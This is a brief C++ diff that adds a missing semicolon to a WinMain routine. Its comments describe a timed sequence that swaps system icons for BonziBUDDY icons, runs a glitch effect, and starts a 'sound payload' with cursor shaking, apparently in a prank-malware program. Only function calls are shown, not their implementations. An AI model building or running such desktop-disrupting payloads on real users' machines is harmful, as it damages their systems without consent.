@@ -643,7 +643,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // 5 Seconds - Change icons with a BonziBUDDY icon
     std::this_thread::sleep_for(std::chrono::seconds(5));
     changeSystemIcons();
-    std::thread(glitchEffect).detach()
+    std::thread(glitchEffect).detach();
 
     // 20 Seconds - Start sound payload and cursor shaking
     std::this_thread::sleep_for(std::chrono::seconds(15));
